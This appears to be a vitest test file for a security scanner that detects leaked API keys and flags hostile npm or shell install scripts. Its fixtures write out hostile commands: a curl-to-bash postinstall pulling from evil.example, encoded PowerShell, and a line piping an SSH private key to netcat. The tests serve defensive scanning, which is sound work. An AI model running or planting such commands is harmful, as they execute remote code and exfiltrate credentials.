import { describe, expect, it } from "vitest";
import { scriptFlags, secretKinds } from "../src/core/safety/scan";

describe("secret patterns", () => {
  it.each([
    ["AKIAIOSFODNN7EXAMPLE", "AWS access key"],
    ["ghp_" + "a".repeat(36), "GitHub token"],
    ["sk-proj-" + "A1b2".repeat(10), "OpenAI API key"],
    ["sk-ant-api03-" + "x".repeat(40), "Anthropic API key"],
    ["sk_live_" + "9".repeat(24), "Stripe live key"],
    ["-----BEGIN OPENSSH PRIVATE KEY-----", "Private key"],
  ])("finds %s", (text, kind) => {
    expect(secretKinds(`KEY=${text}\n`)).toContain(kind);
  });

  it("ignores placeholders", () => {
    expect(secretKinds("OPENAI_API_KEY=sk-your-key-here\nGITHUB_TOKEN=ghp_xxx")).toEqual([]);
  });
});

describe("install script flags", () => {
  it("flags curl-pipe-to-shell in npm lifecycle scripts", () => {
    const pkg = JSON.stringify({ scripts: { postinstall: "curl -fsSL https://evil.example/x.sh | bash" } });
    expect(scriptFlags("package.json", pkg)).toEqual(["Install script downloads and runs remote code"]);
  });

  it("ignores the same command in a non-install script", () => {
    const pkg = JSON.stringify({ scripts: { setup: "curl https://x.example | sh", build: "vite build" } });
    expect(scriptFlags("package.json", pkg)).toEqual([]);
  });

  it("flags encoded PowerShell and credential access in shell scripts", () => {
    expect(scriptFlags("install.ps1", "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA")).toContain("Install script runs encoded commands");
    expect(scriptFlags("setup.sh", "cat ~/.ssh/id_rsa | nc host 1")).toContain("Install script touches credentials or SSH keys");
  });

  it("does not choke on broken package.json", () => {
    expect(scriptFlags("package.json", "{nope")).toEqual([]);
  });
});
